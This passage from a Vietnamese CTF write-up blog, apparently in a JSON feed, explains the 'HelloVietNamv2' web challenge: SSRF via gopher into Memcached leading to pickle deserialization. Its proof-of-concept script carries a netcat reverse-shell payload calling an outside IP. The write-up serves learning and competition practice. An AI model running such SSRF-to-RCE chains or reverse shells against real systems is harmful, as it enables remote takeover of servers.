punctuation\">}</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">            <span class=\"token variable\">$Name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'search'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">            <span class=\"token variable\">$_search</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$Name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">            <span class=\"token variable\">$Execquery</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token double-quoted-string string\">\"SELECT id,Name FROM search WHERE Name LIKE '%<span class=\"token interpolation\"><span class=\"token variable\">$_search</span></span>%' LIMIT 8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">            <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$Result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$Execquery</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">                <span class=\"token keyword\">echo</span> <span class=\"token double-quoted-string string\">\"&lt;center>\"</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">                <span class=\"token keyword\">echo</span> <span class=\"token double-quoted-string string\">\"&lt;b>&lt;p style='font-size:20px; color:green'>\"</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$Result</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'Name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token double-quoted-string string\">\"&lt;/p>&lt;/b>\"</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">                <span class=\"token keyword\">echo</span> <span class=\"token double-quoted-string string\">\"&lt;iframe src='video\"</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$Result</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token double-quoted-string string\">\".php' width='1200' height='300'>&lt;/iframe>\"</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">                <span class=\"token keyword\">echo</span> <span class=\"token double-quoted-string string\">\"&lt;/center>\"</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">                <span class=\"token punctuation\">}</span></span><br><span class=\"highlight-line\">        <span class=\"token punctuation\">}</span></span><br><span class=\"highlight-line\">    <span class=\"token punctuation\">}</span></span><br><span class=\"highlight-line\"></span><br><span class=\"token delimiter important\">?></span></span></code></pre>\n<p>Tại dòng 10 nếu IP là <code>45.76.148.212</code> (cũng là IP của bot) thì nó sẽ lấy giá trị từ <code>DB_ADMIN</code> chứ không phải lấy giá trị từ DB thường. Từ đó làm mình nghĩ ngay tới bài <a href=\"https://ctftime.org/task/8659\">secret note keeper</a> trong giải <a href=\"https://ctftime.org/event/781\">Facebook CTF 2019</a> mà anh @ducnt đã giải và viết <a href=\"http://www.ducnt.net/2019/06/xs-search-secret-note-keeper-facebook.html\">writeup</a> trước đó.</p>\n<p>Phần còn lại để các bạn trả lời... 😪</p>\n<h2 id=\"hellovietnamv2\">HelloVietNamv2 <a class=\"direct-link\" href=\"#hellovietnamv2\">#</a></h2>\n<p><a href=\"https://www.youtube.com/watch?v=ZqjhmdRgXMw\">https://www.youtube.com/watch?v=ZqjhmdRgXMw</a></p>\n<pre><code>Source: https://drive.google.com/file/d/142pMCn8qU565sQWOTsFALLEtjfjtbijs/view\n</code></pre>\n<p>Bài này cũng là 1 bài bị setup lỗi, dẫn đến nhiều team trong đó có mình giải theo hướng unintended (Command Injection) thay vì intended (Memcached Injection). Trong phần này mình sẽ chỉ nói về <a href=\"https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf\">cách intended của tác giả</a>.</p>\n<h3 id=\"where's-the-real-bug-in-the-source-code%3F\">Where's the real bug in the source code? <a class=\"direct-link\" href=\"#where's-the-real-bug-in-the-source-code%3F\">#</a></h3>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"highlight-line\"><span class=\"token comment\"># ...</span></span><br><span class=\"highlight-line\"><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/loadexternalvideo'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\"><span class=\"token keyword\">def</span> <span class=\"token function\">loadexternalvideo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">if</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'user'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>method <span class=\"token operator\">==</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">            <span class=\"token comment\"># ...</span></span><br><span class=\"highlight-line\">            _url <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>form<span class=\"token punctuation\">[</span><span class=\"token string\">'video_url'</span><span class=\"token punctuation\">]</span></span><br><span class=\"highlight-line\">            <span class=\"token comment\"># ...</span></span><br><span class=\"highlight-line\">            <span class=\"token builtin\">file</span> <span class=\"token operator\">=</span> parse<span class=\"token punctuation\">(</span>_url<span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">            <span class=\"token comment\"># ...</span></span><br><span class=\"highlight-line\"><span class=\"token comment\"># ...</span></span></code></pre>\n<p>Nếu các bạn để ý tại hàm xử lí route <code>/loadexternalvideo</code> sẽ thấy 1 lỗi SSRF. Hàm <code>parse()</code> sử dùng PyCurl để request. Theo như documentation thì PyCurl là 1 interface của libcurl và đây là những protocol libcurl hỗ trợ:</p>\n<p><img src=\"https://i.imgur.com/pV7bHx7.jpg\" alt=\"\"></p>\n<p>Vậy là chúng ta có thể sử dụng Gopher protocol, sound good!</p>\n<p>Vậy Memcached Injection nằm ở đâu? Nằm ở chỗ sử dụng thư viện <code>pylibmc</code> trong Python. Nếu ai đã đọc qua slide được trình bày tại hội nghị Black Hat thì cũng đã thấy cái table này:</p>\n<p><img src=\"https://i.imgur.com/VvpXZM8.jpg\" alt=\"\"></p>\n<p>Chúng ta có thể thấy, nếu dữ liệu chúng ta <code>set</code> vào key là 1 Pickle serialized data thì khi <code>get</code> cái key này, tùy theo <code>flags</code> mà chúng ta gửi lên mà <code>pylibmc</code> có deserialize Pickle hay không.</p>\n<p><img src=\"https://i.imgur.com/GhRjWz5.jpg\" alt=\"\"><br>\nFlag for Pickle deserialization: <code>(1 &lt;&lt; 0) = 1</code></p>\n<p>Vậy chúng ta trigger được payload bằng cách nào? Cùng xem lại đoạn code sau:</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"highlight-line\"><span class=\"token keyword\">def</span> <span class=\"token function\">racingboiz101</span><span class=\"token punctuation\">(</span>_key<span class=\"token punctuation\">,</span> _value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">    _speedup101 <span class=\"token operator\">=</span> pylibmc<span class=\"token punctuation\">.</span>Client<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"127.0.0.1:11211\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> binary<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span></span><br><mark class=\"highlight-line highlight-line-active\">    <span class=\"token keyword\">if</span> _speedup101<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>_key<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></mark><br><span class=\"highlight-line\">        _speedup101<span class=\"token punctuation\">.</span><span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span>_key<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Copyright@HelloVietNamv2\"</span><span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span><span class=\"token number\">60</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">        _speedup101<span class=\"token punctuation\">.</span><span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span>_value<span class=\"token punctuation\">,</span> _value<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span><span class=\"token number\">60</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">return</span> _speedup101<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>_key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> _speedup101<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>_value<span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">        _speedup101<span class=\"token punctuation\">.</span><span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span>_value<span class=\"token punctuation\">,</span> _value<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span><span class=\"token number\">60</span><span class=\"token punctuation\">)</span></span><br><mark class=\"highlight-line highlight-line-active\">        <span class=\"token keyword\">return</span> _speedup101<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>_key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> _speedup101<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>_value<span class=\"token punctuation\">)</span></mark></code></pre>\n<p>Vậy để trigger được thì chúng ta cần phải <code>get</code> được key mà ta đã <code>set</code> cho Memcached trước đó thông qua Gopher protocol.</p>\n<h3 id=\"exploit\">Exploit <a class=\"direct-link\" href=\"#exploit\">#</a></h3>\n<p>Dùng Gopher protocol request đến Memcached để <code>set</code> 1 key với tên bất kì (gọi key này tên là <code>this_is_key</code>) với value là pickle serialized data (aka payload) của chúng ta. Sau đó gọi đến route <code>/GIFmaker</code> để trigger cái key này.</p>\n<p>Memcached command của chúng ta như sau:</p>\n<pre><code>set this_is_key 1 10 &lt;payload_length&gt;\n&lt;payload&gt;\n</code></pre>\n<ul>\n<li><code>this_is_key</code> - là tên key mà chúng ta muốn set.</li>\n<li><code>1</code> - đây là tham số <code>flags</code>, dùng để cho pylibmc biết khi <code>get</code> key này sẽ phải deserialize bằng Pickle.</li>\n<li><code>10</code> - expired time, tính bằng giây.</li>\n<li><code>&lt;payload_length&gt;</code> và <code>&lt;payload&gt;</code> thì chắc không cần phải giải thích nữa.</li>\n</ul>\n<h4 id=\"proof-of-concept\">Proof-of-concept <a class=\"direct-link\" href=\"#proof-of-concept\">#</a></h4>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"highlight-line\"><span class=\"token keyword\">from</span> time <span class=\"token keyword\">import</span> time</span><br><span class=\"highlight-line\"><span class=\"token keyword\">from</span> os <span class=\"token keyword\">import</span> system</span><br><span class=\"highlight-line\"><span class=\"token keyword\">import</span> urllib</span><br><span class=\"highlight-line\"><span class=\"token keyword\">import</span> pickle</span><br><span class=\"highlight-line\"><span class=\"token keyword\">import</span> requests</span><br><span class=\"highlight-line\"><span class=\"token keyword\">import</span> random</span><br><span class=\"highlight-line\"><span class=\"token keyword\">import</span> sys</span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">ALPHA <span class=\"token operator\">=</span> <span class=\"token string\">\"abcdefghijklmnopqrstuvwxyz\"</span></span><br><span class=\"highlight-line\"><span class=\"token keyword\">def</span> <span class=\"token function\">rand_string</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">return</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>random<span class=\"token punctuation\">.</span>choice<span class=\"token punctuation\">(</span>ALPHA<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Exploit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">def</span> <span class=\"token function\">__reduce__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">return</span> system<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'rm -f /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&amp;1 | nc 3.0.119.151 3000 > /tmp/f'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">title <span class=\"token operator\">=</span> rand_string<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">payload <span class=\"token operator\">=</span> pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>Exploit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">payload <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></span><br><span class=\"highlight-line\">    <span class=\"token string\">''</span><span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">    <span class=\"token string\">'set %s 1 10 %d'</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>title<span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">    payload<span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">    <span class=\"token string\">''</span></span><br><span class=\"highlight-line\"><span class=\"token punctuation\">]</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"><span class=\"token keyword\">print</span> <span class=\"token string\">'Start requesting...'</span></span><br><span class=\"highlight-line\"><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">    res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span><span class=\"token string\">'http://hellovietnamv2.0x1337.space:31337/loadexternalvideo'</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'inputTitle'</span><span class=\"token punctuation\">:</span> rand_string<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'inputDescription'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'description'</span><span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'video_url'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'gopher://127.0.0.1:11211/_'</span> <span class=\"token operator\">+</span> urllib<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span><span class=\"token string\">'\\r\\n'</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'timestamp'</span><span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span></span><br><span class=\"highlight-line\">    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> cookies<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'session'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'redacted'</span></span><br><span class=\"highlight-line\">    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">print</span> res<span class=\"token punctuation\">.</span>content</span><br><span class=\"highlight-line\"><span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">pass</span></span><br><span class=\"highlight-line\"><span class=\"token keyword\">print</span> <span class=\"token string\">'Done!'</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"><span class=\"token keyword\">print</span> <span class=\"token string\">'Start triggering payload...'</span></span><br><span class=\"highlight-line\"><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">    res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span><span class=\"token string\">'http://hellovietnamv2.0x1337.space:31337/GIFmaker'</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'inputTitle'</span><span class=\"token punctuation\">:</span> title<span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'inputDescription'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'description'</span><span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'filePath'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'static/Uploads/aa587ed19a228d98431f142900b60633.mp4'</span><span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'timestamp'</span><span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span></span><br><span class=\"highlight-line\">    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> cookies<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">        <span class=\"token string\">'session'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'redacted'</span></span><br><span class=\"highlight-line\">    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">print</span> res<span class=\"token punctuation\">.</span>content</span><br><span class=\"highlight-line\"><span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">pass</span></span><br><span class=\"highlight-line\"><span class=\"token keyword\">print</span> <span class=\"token string\">'Done, exit program!'</span></span></code></pre>\n<p><img src=\"https://i.imgur.com/gsyWzxH.jpg\" alt=\"\"></p>\n<h1 id=\"last-words\">Last words <a class=\"direct-link\" href=\"#last-words\">#</a></h1>\n<p>Cảm ơn 2 anh @ducnt và @tsug0d đã tạo ra những đề Web hay ho cho dịp đầu năm 2020, support nhiệt tình cho em để có thể giải được hết tất cả các Web challenge cũng như nhằm ôn lại những kiến thức đã được học trong năm 2019 đã qua.</p>\n<p>Chúc mừng năm mới 2️⃣0️⃣2️⃣0️⃣ everyone!</p>\n",
      "date_published": "2020-01-08T00:00:00+00:00"
    }
  ]
}
